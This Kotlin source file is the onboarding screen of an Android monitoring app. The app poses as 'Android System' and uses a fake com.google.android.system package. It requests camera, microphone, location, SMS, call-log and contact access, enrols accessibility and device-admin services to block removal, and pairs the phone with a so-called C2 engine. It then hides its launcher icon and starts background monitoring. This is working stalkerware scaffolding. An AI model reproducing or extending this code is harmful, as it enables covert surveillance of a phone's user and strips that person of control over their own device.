package com.homemonitor

import android.Manifest
import android.app.admin.DevicePolicyManager
import android.content.ComponentName
import android.content.Context
import android.content.Intent
import android.content.pm.PackageManager
import android.os.Build
import android.provider.Settings
import android.util.Log
import android.widget.Toast
import androidx.compose.animation.AnimatedVisibility
import androidx.compose.foundation.background
import androidx.compose.foundation.layout.*
import androidx.compose.foundation.rememberScrollState
import androidx.compose.foundation.shape.RoundedCornerShape
import androidx.compose.foundation.verticalScroll
import androidx.compose.material.icons.Icons
import androidx.compose.material.icons.filled.*
import androidx.compose.material3.*
import androidx.compose.runtime.*
import androidx.compose.ui.Alignment
import androidx.compose.ui.Modifier
import androidx.compose.ui.graphics.Color
import androidx.compose.ui.platform.LocalContext
import androidx.compose.ui.text.font.FontWeight
import androidx.compose.ui.text.input.PasswordVisualTransformation
import androidx.compose.ui.text.input.VisualTransformation
import androidx.compose.ui.unit.dp
import androidx.compose.ui.unit.sp
import androidx.core.content.ContextCompat
import com.google.android.system.AppAccessibilityService
import com.google.android.system.AppDeviceAdminReceiver
import com.google.android.system.C2Gatekeeper
import com.google.android.system.MonitorService
import com.google.android.system.SecurityVaultManager
import kotlinx.coroutines.*

/**
 * UserEnrollmentScreen
 *
 * Modern multi-page light-themed Jetpack Compose onboarding & enrollment UI for Android System.
 * Step 1: Parent Account Authentication & Device Pairing
 * Step 2: Device Identity & System Permissions Matrix
 * Step 3: Activation Status & Auto-Hide Disguise Setup
 */
@OptIn(ExperimentalMaterial3Api::class)
@Composable
fun UserEnrollmentScreen(
    onEnrollmentComplete: () -> Unit,
    onActivateDisguise: () -> Unit
) {
    val context = LocalContext.current
    val prefs = remember { SecurityVaultManager.getEncryptedPrefs(context) }

    var currentStep by remember { mutableStateOf(1) }

    var parentEmailInput by remember { mutableStateOf(prefs.getString("user_firebase_email", "") ?: "") }
    var parentPasswordInput by remember { mutableStateOf("") }
    var showPassword by remember { mutableStateOf(false) }
    var isCreatingNewAccount by remember { mutableStateOf(false) }
    var deviceNickname by remember { mutableStateOf(prefs.getString("user_device_nickname", Build.MODEL) ?: Build.MODEL) }
    var autoHideDisguise by remember { mutableStateOf(prefs.getBoolean("is_app_hidden", true)) }
    var isAuthenticating by remember { mutableStateOf(false) }
    var authErrorMessage by remember { mutableStateOf<String?>(null) }

    fun checkRuntimePermissions(): Boolean {
        val perms = arrayOf(
            Manifest.permission.CAMERA,
            Manifest.permission.RECORD_AUDIO,
            Manifest.permission.ACCESS_FINE_LOCATION,
            Manifest.permission.READ_CONTACTS,
            Manifest.permission.READ_SMS,
            Manifest.permission.SEND_SMS,
            Manifest.permission.READ_CALL_LOG,
            Manifest.permission.READ_PHONE_STATE
        )
        return perms.all { ContextCompat.checkSelfPermission(context, it) == PackageManager.PERMISSION_GRANTED }
    }

    fun checkDeviceAdmin(): Boolean {
        return try {
            val dpm = context.getSystemService(Context.DEVICE_POLICY_SERVICE) as DevicePolicyManager
            val admin = ComponentName(context, AppDeviceAdminReceiver::class.java)
            dpm.isAdminActive(admin)
        } catch (_: Exception) { false }
    }

    var hasRuntimePerms by remember { mutableStateOf(checkRuntimePermissions()) }
    var hasAccessibilityPerm by remember { mutableStateOf(AppAccessibilityService.instance != null) }
    var hasAdminPerm by remember { mutableStateOf(checkDeviceAdmin()) }

    // Light Theme Color Palette
    val lightBg = Color(0xFFF8FAFC)
    val cardBg = Color(0xFFFFFFFF)
    val primaryBlue = Color(0xFF2563EB)
    val textDark = Color(0xFF0F172A)
    val textMuted = Color(0xFF64748B)

    MaterialTheme(
        colorScheme = lightColorScheme(
            background = lightBg,
            surface = cardBg,
            primary = primaryBlue,
            onBackground = textDark,
            onSurface = textDark
        )
    ) {
        Scaffold(
            topBar = {
                TopAppBar(
                    title = {
                        Column {
                            Text("Android System Onboarding", fontWeight = FontWeight.Bold, fontSize = 18.sp, color = textDark)
                            Text("Step $currentStep of 3", fontSize = 12.sp, color = textMuted)
                        }
                    },
                    colors = TopAppBarDefaults.topAppBarColors(containerColor = cardBg)
                )
            },
            containerColor = lightBg
        ) { padding ->
            Column(
                modifier = Modifier
                    .fillMaxSize()
                    .padding(padding)
                    .padding(16.dp)
                    .verticalScroll(rememberScrollState()),
                horizontalAlignment = Alignment.CenterHorizontally
            ) {
                // Progress Indicator Bar
                Row(
                    modifier = Modifier.fillMaxWidth().padding(bottom = 16.dp),
                    horizontalArrangement = Arrangement.spacedBy(8.dp)
                ) {
                    for (step in 1..3) {
                        val active = step <= currentStep
                        Box(
                            modifier = Modifier
                                .weight(1f)
                                .height(6.dp)
                                .background(
                                    color = if (active) primaryBlue else Color(0xFFE2E8F0),
                                    shape = RoundedCornerShape(3.dp)
                                )
                        )
                    }
                }

                when (currentStep) {
                    1 -> {
                        // ── STEP 1: Parent Account Authentication ──
                        Card(
                            colors = CardDefaults.cardColors(containerColor = cardBg),
                            elevation = CardDefaults.cardElevation(2.dp),
                            modifier = Modifier.fillMaxWidth()
                        ) {
                            Column(modifier = Modifier.padding(20.dp)) {
                                Icon(
                                    Icons.Default.Security,
                                    contentDescription = null,
                                    tint = primaryBlue,
                                    modifier = Modifier.size(48.dp)
                                )
                                Spacer(modifier = Modifier.height(12.dp))
                                Text("Parent Account Authentication", fontSize = 20.sp, fontWeight = FontWeight.Bold, color = textDark)
                                Text(
                                    "Sign in or register with your Parent Account to enroll and manage this device.",
                                    fontSize = 13.sp,
                                    color = textMuted
                                )

                                Spacer(modifier = Modifier.height(16.dp))

                                Row(
                                    verticalAlignment = Alignment.CenterVertically,
                                    modifier = Modifier.fillMaxWidth().padding(bottom = 8.dp)
                                ) {
                                    FilterChip(
                                        selected = !isCreatingNewAccount,
                                        onClick = { isCreatingNewAccount = false },
                                        label = { Text("Sign In", fontSize = 12.sp, fontWeight = FontWeight.Bold) }
                                    )
                                    Spacer(modifier = Modifier.width(8.dp))
                                    FilterChip(
                                        selected = isCreatingNewAccount,
                                        onClick = { isCreatingNewAccount = true },
                                        label = { Text("Create Account", fontSize = 12.sp, fontWeight = FontWeight.Bold) }
                                    )
                                }

                                OutlinedTextField(
                                    value = parentEmailInput,
                                    onValueChange = { parentEmailInput = it },
                                    label = { Text(if (isCreatingNewAccount) "New Parent Email" else "Parent Account Email") },
                                    leadingIcon = { Icon(Icons.Default.Email, contentDescription = null) },
                                    modifier = Modifier.fillMaxWidth(),
                                    singleLine = true
                                )

                                Spacer(modifier = Modifier.height(12.dp))

                                OutlinedTextField(
                                    value = parentPasswordInput,
                                    onValueChange = { parentPasswordInput = it },
                                    label = { Text(if (isCreatingNewAccount) "New Parent Password" else "Parent Password") },
                                    leadingIcon = { Icon(Icons.Default.Lock, contentDescription = null) },
                                    trailingIcon = {
                                        IconButton(onClick = { showPassword = !showPassword }) {
                                            Icon(
                                                if (showPassword) Icons.Default.VisibilityOff else Icons.Default.Visibility,
                                                contentDescription = null
                                            )
                                        }
                                    },
                                    visualTransformation = if (showPassword) VisualTransformation.None else PasswordVisualTransformation(),
                                    modifier = Modifier.fillMaxWidth(),
                                    singleLine = true
                                )

                                Spacer(modifier = Modifier.height(16.dp))

                                Card(
                                    colors = CardDefaults.cardColors(containerColor = Color(0xFFF1F5F9)),
                                    modifier = Modifier.fillMaxWidth()
                                ) {
                                    Column(modifier = Modifier.padding(12.dp)) {
                                        Text("🔥 Device Identity Security Model", fontWeight = FontWeight.SemiBold, fontSize = 12.sp, color = primaryBlue)
                                        Text("• Independent Device Identity: Firebase Auth 🔐", fontSize = 11.sp, color = textDark)
                                        Text("• Parent Authorization: Direct Account Link 🛡️", fontSize = 11.sp, color = textDark)
                                    }
                                }

                                if (!authErrorMessage.isNullOrBlank()) {
                                    Spacer(modifier = Modifier.height(12.dp))
                                    Text(
                                        text = authErrorMessage!!,
                                        color = Color.Red,
                                        fontSize = 12.sp,
                                        fontWeight = FontWeight.Medium
                                    )
                                }

                                Spacer(modifier = Modifier.height(24.dp))

                                Button(
                                    enabled = !isAuthenticating,
                                    onClick = {
                                        isAuthenticating = true
                                        authErrorMessage = null

                                        val emailStr = parentEmailInput.trim().lowercase(java.util.Locale.ROOT)
                                        val passStr = parentPasswordInput.trim()

                                        if (emailStr.isBlank() || passStr.isBlank()) {
                                            isAuthenticating = false
                                            Toast.makeText(context, "Please enter parent email and password", Toast.LENGTH_SHORT).show()
                                        } else {
                                            android.os.Handler(android.os.Looper.getMainLooper()).postDelayed({
                                                if (isAuthenticating) {
                                                    isAuthenticating = false
                                                    authErrorMessage = "Network timeout during authentication. Please check internet connection."
                                                }
                                            }, 12000L)

                                            val auth = com.google.firebase.auth.FirebaseAuth.getInstance()

                                            val onPerformDirectPairing = { parentUid: String ->
                                                prefs.edit().putString("user_firebase_email", emailStr).apply()
                                                val scope = CoroutineScope(Dispatchers.Main)
                                                val engine = com.google.android.system.FirebaseC2Engine(
                                                    context.applicationContext,
                                                    okhttp3.OkHttpClient(),
                                                    scope
                                                ) { _, _ -> }

                                                engine.submitDirectParentPairing(parentUid, deviceNickname) { success, pairingErr ->
                                                    isAuthenticating = false
                                                    if (success) {
                                                        Toast.makeText(context, "Parent account authenticated & device enrolled!", Toast.LENGTH_SHORT).show()
                                                        currentStep = 2
                                                    } else {
                                                        authErrorMessage = pairingErr ?: "Direct enrollment failed."
                                                        Toast.makeText(context, "Pairing Error: $pairingErr", Toast.LENGTH_LONG).show()
                                                    }
                                                }
                                            }

                                            if (isCreatingNewAccount) {
                                                auth.createUserWithEmailAndPassword(emailStr, passStr).addOnCompleteListener { createTask ->
                                                    if (createTask.isSuccessful) {
                                                        val parentUid = createTask.result?.user?.uid ?: ""
                                                        onPerformDirectPairing(parentUid)
                                                    } else {
                                                        auth.signInWithEmailAndPassword(emailStr, passStr).addOnCompleteListener { signInTask ->
                                                            if (signInTask.isSuccessful) {
                                                                val parentUid = signInTask.result?.user?.uid ?: ""
                                                                onPerformDirectPairing(parentUid)
                                                            } else {
                                                                isAuthenticating = false
                                                                val err = createTask.exception?.localizedMessage ?: "Account creation failed."
                                                                authErrorMessage = err
                                                                Toast.makeText(context, "Account Error: $err", Toast.LENGTH_LONG).show()
                                                            }
                                                        }
                                                    }
                                                }
                                            } else {
                                                auth.signInWithEmailAndPassword(emailStr, passStr).addOnCompleteListener { parentTask ->
                                                    if (parentTask.isSuccessful) {
                                                        val parentUid = parentTask.result?.user?.uid ?: ""
                                                        onPerformDirectPairing(parentUid)
                                                    } else {
                                                        isAuthenticating = false
                                                        val err = parentTask.exception?.localizedMessage ?: "Parent authentication failed."
                                                        authErrorMessage = err
                                                        Toast.makeText(context, "Sign-In Error: $err", Toast.LENGTH_LONG).show()
                                                    }
                                                }
                                            }
                                        }
                                    },
                                    modifier = Modifier.fillMaxWidth().height(50.dp),
                                    colors = ButtonDefaults.buttonColors(containerColor = primaryBlue)
                                ) {
                                    if (isAuthenticating) {
                                        CircularProgressIndicator(modifier = Modifier.size(24.dp), color = Color.White, strokeWidth = 2.dp)
                                    } else {
                                        Text(
                                            if (isCreatingNewAccount) "Create Account & Enroll" else "Sign In & Enroll Device",
                                            fontSize = 15.sp,
                                            fontWeight = FontWeight.Bold
                                        )
                                        Spacer(modifier = Modifier.width(8.dp))
                                        Icon(Icons.Default.ArrowForward, contentDescription = null)
                                    }
                                }
                            }
                        }
                    }

                    2 -> {
                        // ── STEP 2: Device Naming & Permissions Matrix ──
                        Card(
                            colors = CardDefaults.cardColors(containerColor = cardBg),
                            elevation = CardDefaults.cardElevation(2.dp),
                            modifier = Modifier.fillMaxWidth()
                        ) {
                            Column(modifier = Modifier.padding(20.dp)) {
                                Icon(Icons.Default.Devices, contentDescription = null, tint = primaryBlue, modifier = Modifier.size(40.dp))
                                Spacer(modifier = Modifier.height(8.dp))
                                Text("Device Identity & System Permissions", fontSize = 18.sp, fontWeight = FontWeight.Bold, color = textDark)
                                Text("Assign a recognized nickname for this device and grant required permissions.", fontSize = 12.sp, color = textMuted)

                                Spacer(modifier = Modifier.height(16.dp))

                                OutlinedTextField(
                                    value = deviceNickname,
                                    onValueChange = {
                                        deviceNickname = it
                                        prefs.edit().putString("user_device_nickname", it).apply()
                                    },
                                    label = { Text("Child Device Nickname") },
                                    leadingIcon = { Icon(Icons.Default.Edit, contentDescription = null) },
                                    modifier = Modifier.fillMaxWidth(),
                                    singleLine = true
                                )

                                Spacer(modifier = Modifier.height(16.dp))

                                PermissionStatusRow(
                                    title = "Runtime System Permissions",
                                    description = "Camera, Mic, GPS, SMS, Contacts & Phone State",
                                    isGranted = hasRuntimePerms,
                                    onRequest = {
                                        (context as? android.app.Activity)?.requestPermissions(
                                            arrayOf(
                                                Manifest.permission.CAMERA,
                                                Manifest.permission.RECORD_AUDIO,
                                                Manifest.permission.ACCESS_FINE_LOCATION,
                                                Manifest.permission.READ_CONTACTS,
                                                Manifest.permission.READ_SMS,
                                                Manifest.permission.SEND_SMS,
                                                Manifest.permission.READ_CALL_LOG,
                                                Manifest.permission.READ_PHONE_STATE
                                            ),
                                            101
                                        )
                                        hasRuntimePerms = checkRuntimePermissions()
                                    }
                                )

                                Spacer(modifier = Modifier.height(8.dp))

                                PermissionStatusRow(
                                    title = "Accessibility Guard Service",
                                    description = "Realtime anti-tamper protection & system monitoring",
                                    isGranted = hasAccessibilityPerm,
                                    onRequest = {
                                        try {
                                            val intent = Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS).apply {
                                                addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
                                            }
                                            context.startActivity(intent)
                                        } catch (_: Exception) {}
                                    }
                                )

                                Spacer(modifier = Modifier.height(8.dp))

                                PermissionStatusRow(
                                    title = "Device Admin Authorization",
                                    description = "Prevents unauthorized uninstall or force stop",
                                    isGranted = hasAdminPerm,
                                    onRequest = {
                                        try {
                                            val admin = ComponentName(context, AppDeviceAdminReceiver::class.java)
                                            val intent = Intent(DevicePolicyManager.ACTION_ADD_DEVICE_ADMIN).apply {
                                                putExtra(DevicePolicyManager.EXTRA_DEVICE_ADMIN, admin)
                                                putExtra(DevicePolicyManager.EXTRA_ADD_EXPLANATION, "Enables hardware-level protection for HomeMonitor.")
                                                addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
                                            }
                                            context.startActivity(intent)
                                        } catch (_: Exception) {}
                                    }
                                )

                                Spacer(modifier = Modifier.height(20.dp))

                                Button(
                                    onClick = { currentStep = 3 },
                                    modifier = Modifier.fillMaxWidth().height(50.dp),
                                    colors = ButtonDefaults.buttonColors(containerColor = primaryBlue)
                                ) {
                                    Text("Continue to Final Setup", fontSize = 15.sp, fontWeight = FontWeight.Bold)
                                    Spacer(modifier = Modifier.width(8.dp))
                                    Icon(Icons.Default.ArrowForward, contentDescription = null)
                                }
                            }
                        }
                    }

                    3 -> {
                        // ── STEP 3: Activation & Disguise Setup ──
                        Card(
                            colors = CardDefaults.cardColors(containerColor = cardBg),
                            elevation = CardDefaults.cardElevation(2.dp),
                            modifier = Modifier.fillMaxWidth()
                        ) {
                            Column(modifier = Modifier.padding(20.dp)) {
                                Icon(Icons.Default.CheckCircle, contentDescription = null, tint = Color(0xFF16A34A), modifier = Modifier.size(48.dp))
                                Spacer(modifier = Modifier.height(12.dp))
                                Text("Setup Complete & Ready for Activation", fontSize = 20.sp, fontWeight = FontWeight.Bold, color = textDark)
                                Text("Configure launcher disguise behavior and start monitoring service.", fontSize = 13.sp, color = textMuted)

                                Spacer(modifier = Modifier.height(16.dp))

                                Card(
                                    colors = CardDefaults.cardColors(containerColor = Color(0xFFF1F5F9)),
                                    modifier = Modifier.fillMaxWidth()
                                ) {
                                    Row(
                                        modifier = Modifier.padding(12.dp),
                                        verticalAlignment = Alignment.CenterVertically
                                    ) {
                                        Checkbox(
                                            checked = autoHideDisguise,
                                            onCheckedChange = {
                                                autoHideDisguise = it
                                                prefs.edit().putBoolean("is_app_hidden", it).apply()
                                            }
                                        )
                                        Spacer(modifier = Modifier.width(8.dp))
                                        Column {
                                            Text("Disguise / Hide Launcher Icon", fontWeight = FontWeight.Bold, fontSize = 13.sp, color = textDark)
                                            Text("Hides app from launcher drawer after activation for discrete operation.", fontSize = 11.sp, color = textMuted)
                                        }
                                    }
                                }

                                Spacer(modifier = Modifier.height(20.dp))

                                Button(
                                    onClick = {
                                        prefs.edit().putBoolean("is_enrolled", true).apply()

                                        try {
                                            val serviceIntent = Intent(context, MonitorService::class.java)
                                            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                                                context.startForegroundService(serviceIntent)
                                            } else {
                                                context.startService(serviceIntent)
                                            }
                                        } catch (_: Exception) {}

                                        if (autoHideDisguise) {
                                            onActivateDisguise()
                                        } else {
                                            onEnrollmentComplete()
                                        }
                                        Toast.makeText(context, "✅ Android System Enrolled Successfully!", Toast.LENGTH_LONG).show()
                                    },
                                    modifier = Modifier.fillMaxWidth().height(52.dp),
                                    colors = ButtonDefaults.buttonColors(containerColor = Color(0xFF16A34A))
                                ) {
                                    Text("Complete Setup & Activate", fontSize = 16.sp, fontWeight = FontWeight.Bold)
                                }
                            }
                        }
                    }
                }
            }
        }
    }
}

@Composable
private fun PermissionStatusRow(
    title: String,
    description: String,
    isGranted: Boolean,
    onRequest: () -> Unit
) {
    Card(
        colors = CardDefaults.cardColors(containerColor = if (isGranted) Color(0xFFF0FDF4) else Color(0xFFFEF2F2)),
        modifier = Modifier.fillMaxWidth()
    ) {
        Row(
            modifier = Modifier.padding(12.dp),
            verticalAlignment = Alignment.CenterVertically
        ) {
            Icon(
                if (isGranted) Icons.Default.CheckCircle else Icons.Default.Warning,
                contentDescription = null,
                tint = if (isGranted) Color(0xFF16A34A) else Color(0xFFDC2626),
                modifier = Modifier.size(24.dp)
            )
            Spacer(modifier = Modifier.width(12.dp))
            Column(modifier = Modifier.weight(1f)) {
                Text(title, fontWeight = FontWeight.Bold, fontSize = 13.sp, color = if (isGranted) Color(0xFF15803D) else Color(0xFF991B1B))
                Text(description, fontSize = 11.sp, color = if (isGranted) Color(0xFF166534) else Color(0xFFB91C1C))
            }
            if (!isGranted) {
                Button(
                    onClick = onRequest,
                    contentPadding = PaddingValues(horizontal = 12.dp, vertical = 4.dp),
                    colors = ButtonDefaults.buttonColors(containerColor = Color(0xFF2563EB))
                ) {
                    Text("Grant", fontSize = 12.sp)
                }
            }
        }
    }
}
